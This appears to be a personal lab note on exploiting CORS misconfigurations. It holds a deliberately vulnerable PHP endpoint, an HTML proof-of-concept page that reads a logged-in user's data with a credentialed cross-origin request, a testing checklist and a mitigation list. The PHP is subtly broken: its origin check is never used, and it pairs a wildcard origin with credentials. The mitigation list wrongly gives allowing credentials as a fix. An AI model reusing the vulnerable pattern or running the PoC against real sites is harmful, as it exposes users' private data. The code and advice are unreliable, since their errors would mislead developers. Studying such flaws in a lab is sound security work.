# CORS Attack

ow HTTP Headers

Access-Control-Allow: \* or \<origin> or null

Access-Control-Credentials:

if Access Access-Control-Credentials: true

**is Vulnerable CORS**

```php
<?php
session_start();

if($_SESSION['islogin'] != 1){
	header("Location: login.php");
	die();
}
#vulnerablity here
$origin = "mydomain.com";
if ( strpos(@$_SERVER['HTTP_ORIGIN'], "mydomain.com") ){
	$origin = @$_SERVER['HTTP_ORIGIN'];
}

header("Content-Type: application/json");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");

echo '{"name":"Guest user", "phone number":"0234235","email":"email@gmail.com","adddress":"street 3","own books":["Book one","Book two","Book three"],"private books":["book 4","book 5"]}';
```

POS (if data json use Content-Type = application/json)

```jsx
<!DOCTYPE html>
<html>
<head>
    <script>
        function cors() {
            var xhttp = new XMLHttpRequest();
            url = "<url>";
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    // Display the response in an alert
                    alert(this.responseText);
                    // Or display the response in the demo div
                    document.getElementById("demo").innerHTML = this.responseText;
                }
            };
            xhttp.open("GET", url, true);
            xhttp.withCredentials = true;
            xhttp.send();
        }
    </script>
</head>
<body>
    <center>
        <h2>CORS PoC Exploit</h2>
        <div id="demo">
            <button type="button" onclick="cors()">Exploit</button>
        </div>
    </center>
</body>
</html>

```

I will try to find this vuln Uing Burpsuit Come with me!

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

in this request allow credentials if

#### Testing For CORS Vulnerabilities

1. remove/add a domain or like attckerlocalhost

* Map the application • Test the application for dynamic generation • Does it reflect the user-supplied ACAO header? • Does it only validate on the start/end of a specific string? • Does it allow the null origin? \* or yourdoamin,com • Does it restrict the protocol? HTTP or https | 80,8080 or any think • Does it allow credentials?

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

Click exploit B000000000M!

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Mitigation

**1. restrict Allowed Origins**

**Access-control-Allow-Origin:** [**https://example.com**](https://example.com)

**2. Limit HTTP Methods**

**Access-control-Allow-Methods: GET, POST**

**3. Control Allowed Header**

**Access-Control-Allow-Headers: Content-Type, Authorization**

1. **Access-Control-Allow-Credentials: true**
2. **Validate Input and Origin**
3. **Content security Policy (CSP)**

**Content-Security-Policy: default-src 'self'; script-src 'self'** [**https://example.com**](https://example.com)

[http://localhost/labs/cors/info.php](http://localhost/labs/cors/info.php)
